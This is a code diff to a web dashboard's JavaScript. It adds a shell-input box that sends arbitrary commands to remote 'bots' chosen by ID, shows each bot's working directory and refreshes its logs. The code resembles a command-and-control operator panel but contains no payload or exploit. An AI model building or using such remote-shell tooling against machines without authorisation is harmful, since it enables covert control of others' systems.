@@ -18,6 +18,94 @@ function formatLogsWithLineNumbers(logs, startingLineNumber = 1) {
     return formattedLines.join('');
 }
 
+// Function to fetch the current working directory
+async function fetchCWD() {
+    const cwdDisplay = document.getElementById("cwd-display");
+    const botId = document.getElementById("client-id").value;
+    if (!botId) {
+        cwdDisplay.textContent = "No bot selected $";
+        return;
+    }
+
+    try {
+        const response = await fetch(`/api/cwd?bot_id=${botId}`);
+        if (response.ok) {
+            const data = await response.json();
+            cwdDisplay.textContent = `${data.cwd} $`;
+        } else {
+            console.error("Failed to fetch CWD");
+            cwdDisplay.textContent = "Error retrieving CWD $";
+        }
+    } catch (error) {
+        console.error("Error fetching CWD:", error);
+        cwdDisplay.textContent = "Error retrieving CWD $";
+    }
+}
+
+// Event listener for DOMContentLoaded
+document.addEventListener("DOMContentLoaded", () => {
+    const shellInput = document.getElementById("shell-input");
+    const sendShellCommandButton = document.getElementById("send-shell-command");
+    const cwdDisplay = document.getElementById("cwd-display");
+
+    // Function to send a shell command
+    async function sendShellCommand() {
+        const command = shellInput.value.trim();
+        if (!command) return;
+
+        const botId = document.getElementById("client-id").value;
+        if (!botId) {
+            alert("Please enter a Bot ID first.");
+            return;
+        }
+
+        const payload = {
+            bot_id: botId,
+            cmd_id: "0",
+            program: command.split(" ")[0], // First word is the program
+            params: command.split(" ").slice(1).join(" "), // Remaining words are parameters
+            delay: 0,
+            expected_exit_code: 0,
+        };
+
+        try {
+            const response = await fetch('/api/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `bot_id=${encodeURIComponent(payload.bot_id)}&cmd_id=${encodeURIComponent(payload.cmd_id)}&program=${encodeURIComponent(payload.program)}&params=${encodeURIComponent(payload.params)}&delay=${encodeURIComponent(payload.delay)}&expected_code=${encodeURIComponent(payload.expected_exit_code)}`,
+            });
+
+            if (response.ok) {
+                console.log("Command sent successfully");
+                shellInput.value = ""; // Clear the input
+
+                // Refresh the live log file
+                fetchBotLogs(botId, false, true);
+
+                // Refresh the CWD
+                await fetchCWD();
+            } else {
+                console.error("Failed to send command");
+            }
+        } catch (error) {
+            console.error("Error sending command:", error);
+        }
+    }
+
+    // Add click event to the "Send" button
+    sendShellCommandButton.addEventListener("click", sendShellCommand);
+
+    // Map the Enter key to send the command
+    shellInput.addEventListener("keydown", (event) => {
+        if (event.key === "Enter") {
+            event.preventDefault(); // Prevent form submission or default behavior
+            sendShellCommand();
+        }
+    });
+});
+
 // Function to fetch bot logs
 async function fetchBotLogs(botId, prepend = false, isRefresh = false) {
     const fileContentElement = document.getElementById('file-content');
@@ -89,7 +177,7 @@ function setBotId(botId) {
     }
 }
 
-// On page load, fetch the last `linesPerPage` lines and start the timer
+// On page load, fetch the last `linesPerPage` lines, start the timer, and fetch the CWD
 window.onload = () => {
     const botId = getQueryParam('id');
     if (botId) {
@@ -98,8 +186,10 @@ window.onload = () => {
         refreshOffset = 0; // Reset offset for refresh
         fetchBotLogs(botId); // Fetch the logs for the specified bot ID
         startTimer(botId); // Start the timer for regular updates
+        fetchCWD(); // Fetch the current working directory
     } else {
         document.getElementById('file-content').textContent = 'Error: No bot ID provided in the URL.';
+        document.getElementById('cwd-display').textContent = 'No bot selected $';
     }
 };
 
